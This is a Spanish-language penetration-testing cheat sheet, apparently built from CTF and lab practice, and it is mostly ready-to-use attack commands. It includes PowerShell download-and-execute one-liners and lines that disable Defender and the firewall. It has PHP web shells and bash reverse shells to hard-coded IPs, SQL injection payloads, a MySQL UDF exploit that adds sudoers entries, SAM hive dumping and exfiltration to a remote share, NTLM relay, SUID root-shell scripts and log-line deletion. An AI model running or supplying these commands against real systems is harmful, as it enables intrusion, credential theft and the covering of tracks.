# Notas bash/powershell
#### Ayuda memoria 

![GitHub Logo](https://cloud.githubusercontent.com/assets/5456665/13322882/e74f6626-dc00-11e5-921d-f6d024a01eaa.png "GitHub")

#### Tabla de contenidos

- [Powershell](#powershell)
- [Firewall](#firewall)
- [RDP](#rdp)
- [Bash](#bash)
- [OneLiners](#oneliners)
- [Recon](#recon)
- [Brute force](#bruteforcing)
- [Samba](#samba)
- [SAM](#sam)
- [Python TTY](#python-tty)
- [TTY](#tty)
- [PHP](#php)
- [Tmux](#tmux)
- [Mysql](#mysql)
- [Pentesting](#pentesting)

---
#### Powershell
net user USUARIO PASSWORD /add **creación de usuario y contraseña**

net localgroup administradores usuario /add **agrega "usuario" al grupo administradores**

net share NOMBRE_COMPARTIDA C:\ /GRANT:SISTEMAS,FULL **comparte una carpeta con permisos FULL**

copy \\IP\SHARE\FILE FILE **copia de archivos**

powershell.exe Uninstall-WindowsFeature -Name Windows-Defender **desinstalar defender**

---
#### Descarga de archivos via Powershell
powershell.exe -ep -Bypass -nop -noexit -c IEX"(New-Object Net.WebClient).downloadstring('http://ip/file')

powershell.exe -c "(New-Object System.Net.Webclient).DownloadFile('http://ip/file', 'c:\Users\user\file')"

Invoke-WebRequest "http://ip/file" -OutFile "c:\Users\file"

certutil.exe -f -urlcache -split http://ip/file file

---
#### Firewall rules en Windows
netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=in localport=PORT action=allow

netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=out localport=PORT action=allow

netsh advfirewall firewall set allprofiles state off

netsh advfirewall firewall delete rule name=NOMBRE_REGLA

---
#### RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

---
#### Bash
cat file | tr '[A-Z]' '[a-z]' **convierte Mayusculas por Minusculas**

cat file | grep ::: | awk -F: '{print $1":"$4}'

cat file | xclip -sel clip **copia el contenido del archivo en el portapapeles**

cat nmap.grep | grep -oP '\d{1,5}/tcp.*'

xclip -out -sel clip > file **pega lo que tenes en el clipboard en un archivo**

find / -perm -4000 -type f 2>/dev/null

find . -type d -exec touch {}/FILE \;

find . -type f -printf "%T+ %p\n" | sort **ordena archivos con timestamp**

mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs

tr '\n' ',' < tplinkList.txt

'> /tmp/test.txt' **truncar contenido de un archivo**

[ -d "${DIR}" ] || mkdir -p "${DIR}" **crear una carpeta sino existe**

paste -sd "," FILE **agrega una coma entre palabras**

head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo ' ' **generador de passwords**

sed -i '/192\.168\.0\.1/d' /var/log/messages.log **elimina todas las lineas que contienen la ip**

rlwrap nc -lnvp PUERTO **abre un puerto y queda a la espera de conexiones**

awk '{print "https://"$1}'

ping -c ip -R **muestra ruta del ping hasta el destino**

kill -9 $(jobs -p) **elimina los trabajos**

kill % **borra todos los trabajos** 

touch {/folder1/,./}file.{exe,dll,txt} **crea multiples archivos**

xfreerdp /u:USUARIO /p:PASSWORD /size:1366x768 /f /v:10.16.22.103 **conexion remota via RDP**

echo !:2-3 **rango de argumentos**

echo !? **estado de salida del último comando**

echo !$ **ultimo argumento**

echo !^ **primer argumento**

echo !* **todos los argumentos**

curl -# --upload-file -F file=@FILE URL

grep -oP '\[.*?\]' **quita los corchetes**

dd if=FILE bs=1 skip=8 of=FILE.out **saca los primeros 8 bytes y deja el resto**

dd if=FILE bs=1 count=8 of=FILE.out **solo deja los primeros 8 bytes**

read -n 5 -s -p "No podes poner mas de 5 caracteres" **#n=caracteres, s=silent(oculta el texto), p=prompt**

read -t 10 **10 segundos para ingresar texto**

ssh user@IP -o StrictHostKeyChecking=no

---
##### copia de archivos entre hosts via netcat
A> nc -lnvp 9001 < file

V> cat > file < /dev/tcp/ip/9001

---
#### Oneliners
for seq in $(seq 5); do curl -s -i http://10.10.74.120/post?id=$seq | grep 'Post not found' &>/dev/null && echo "post $seq no existe" || echo "post $seq existe"; done' **enumerar posts/ids**

for i in admin dev test backup; do gobuster -u "url"/$i -w "wordlist" -t -o outputFile$i.txt; done **bucle para enum directorios**

for i in {1..20}; do curl http://ip/users/$i 2>&1 | grep "s page</h1>" | cut -f2 -d '>' | cut -f1 -d \' ;done **enum de usuarios**

for i in $(seq 1 10); do ping -c 1 biblio-0$i; done **ping sweep**

for x in port port port; do nmap -Pn --max-retries 0 -p $x ip; done **port knocker**

---
#### Recon
nmap -p445 --scripts "vuln and safe" IP

nmap --script smb-enum-share -p PORTS IP
 
wpscan --url "http://ip" --enumerate u 

smbget -R smb://ip/carpeta -U USER

rpcclient -u '' -c "enumdomusers" -N

---
#### Bruteforcing
ncrack -vv -U "user.lst" -P "pass.lst" ip:port

hydra -L "user.lst" -V -x '6:8aA1!@#$' ip ssh **hydra crea su diccionario para ataque con números, min+may, simbolos**

hydra -l molly -P rockyou.txt 10.10.179.73 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -vV

hashcat --examples-hashes | grep 'mode'

hashcat -m MODE -a 0 HASH diccionario --force -o FILE **a=fuerza bruta, o=archivo destino**

zip2john ZIP > FILE.out

fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt FILE.zip

wfuzz -c -L --hc=404 -w WORDLIST TARGET **L=recursivo** 

wfuzz -c --hc=404 -w WORDLIST -w WORDLIST2 url/FUZZ/FUZ2Z

crunch 15 15 -t STRING+pattern **pattern @lowercase ,uppercase %numbers ^symbols**

---
#### Samba
crackmapexec smb ip -u 'user' -p 'pass'

crackmapexec smb ip -u 'user' -p 'pass' -M mimikatz

crackmapexec smb ip -u 'user' -p 'pass' --shares

crackmapexec smb ip -u 'user' -p 'pass' --lsa

crackmapexec smb ip -u 'user' -p 'pass' --sam

crackmapexec smb ip -u 'user' -p 'pass' -x 'CMD'

crackmapexec smb ip -u 'user' -H 'hash' -x 'CMD'

crackmapexec smb ip -u LIST -p PASS --continue-on-success

crackmapexec smb ip -u DICT -p DICT

impacket-smbserver COMPARTIDA $(pwd) -smb2support -u USUARIO -p PASSWORD

psexec.py 'user_ssh:pass_ssh'@'ip' "C:\plink.exe -batch -hostkey 'hostkey' -N -R 9090:127.0.0.1:3389 'IP_A' -P 1473 -l 'USUARIO' -pw 'PASSWORD_A'"

psexec.py 'user:pass@ip'

psexec.py WORKGROUP/user:pass@ip CMD

smbmap -H host -u 'null'

---
#### SAM Crack - Windows
reg save HKLM\SAM sam.backup

reg save HKLM\SYSTEM system.backup

copy sam.backup \\IP\smbfolder\sam

copy system.backup \\IP\smbfolder\system

pwdump system sam

---
#### Python TTY 
python -c 'import pty; pty.spawn("/bin/bash")'

V>ctrl-Z **pone el proceso en background**

A>stty raw -echo; fg

V>stty row "x" cols "x"

---
#### TTY 
script /dev/null -c bash

mkfifo input; tail -f input | /bin/bash > output

---
#### PHP
```
<?php system($_GET['cmd']);?>
<?php system('ls -la');?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
<?php system("wget http://ip/file -o /tmp/file.php; php /tmp/file.php"); ?>
<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
```
---
#### Tmux copy mode - prefix=CTRL+b 
prefix + [

ctrl + space

ctrl + w

prefix + ]

---
#### Tmux search mode
prefix + [

ctrl + s **n=para busqueda, shift+n=busqueda reversa** 

---
#### Mysql
1'-- -

admin'-- -

and 1 = 1

and 2 = 1 union select 1,2,3

order by 100;

union select 1,2,3,4;

union select 1,2,3,database();

union select 1,2,3,user();

union select 1,2,3,load_file('/etc/passwd');

union select schema_name,2,3,4 from information_schema.schemata; **muestra todas las db**

union select schema_name,2,3,4 from information_schema.schemata limit 1,1; **para forzar que muestre las db** 

union select 1,2,table_name,4 from information_schema.tables where table_schema = 'sqhell_5'; **tablas**

union select 1,2,column_name,4 from information_schema.columns where table_schema = 'sqhell_5' and table_name = 'flag'; **columnas**

union select 1,2,id,4 from sqhell_5.flag; **muestra el contenido de la tabla sqhell_5 la columna flag**

union select 1,2,concat(id,0x3a,flag),4 from sqhell_5.flag;

mysql -u USER -p PASS -P CMD

mysqlshow -u USER -p PASS DATABASE TABLES

mysqldump -u USER --password=PASS --single-transaction --all-databases

mysqldump -u USER --password=PASS --no-data TABLES

mysqldump -u root -p Password123! --all-databases > all_db_backup.sql

sqlmap -u URL --method POST --data "username=FUZZ&password=" -P username --dbs --dbms mysql --level 2

sqlmap.py -u "http://ip/register/user-check?username=admin" --dbms mysql -D database -T flag --dump

---
##### mysql (UDFs exploit):
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

mysql -u root

use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

select do_system('bash -i >& /dev/tcp/10.8.23.159/9001 0>&1'); #bash rev shell
select do_system('echo "smeagol ALL =(ALL) NOPASSWD: ALL" >> /etc/sudoers'); # modificando /etc/sudoers

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash'); 
/tmp/rootbash -p # root shell
```
---
#### Pentesting
---
##### psexec
psexec.py DOMAIN/USER:PASS cmd.exe

---
##### pth-winexe
pth-winexe -U DOMINIO/USUARIO%PASS //IP cmd.exe

pth-winexe -U DOMINIO/Administrator%HASH:HASH //IP cmd.exe

---
##### responder-ntlmrelayx
responder.conf  **smb off + http off**

ntlmrelayx.py -tf targets.txt -smb2support **crear un archivo con los targets >> targets.txt**

Responder.py -I INTERFACE -rdw

---
##### responder-ntlmrelayx con smbserver
ntlmrelayx.py -tf targets.txt -c "certutil.exe -f -urlcache -split IP:PUERTO/nc.exe C:\Windows\Temp\nc.exe"-smb2support

Responder.py -I INTERFACE -rdw

python -m SimpleHTTPServer<

---
##### arp discovery
arping -c 1 -I enp5s0 ip/mask

arp-scan -I enp5s0 ip/mask

masscan --arp ip/mask > file

sudo nmap -RP ip

---
##### sudo - escalada de privilegios
sudo /usr/sbin/iftop -->!sh

sudo find . -exec /bin/sh \; -quit

sudo nano --> CTRL+R + CTRL+X --> reset; sh 1>&0 2>&0

sudo vim -c ':!/bin/sh'

sudo man man --> !/bin/sh

sudo awk 'BEGIN {system("/bin/sh")}'

sudo less /etc/profile --> !/bin/sh

sudo ftp --> !sh

sudo nmap --interactive --> !sh

TERM=sudo more /etc/profile --> !sh

---
##### script para escalar privilegios en bash
```
!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
/tmp/rootbash -p
```

##### script para escalar privilegios en C
```
include <stdio.h>
include <stdlib.h>
static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

##### msfvenom escalar privilegios
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
/tmp/shell.elf
```

- [Inicio](#Ayuda-memoria)

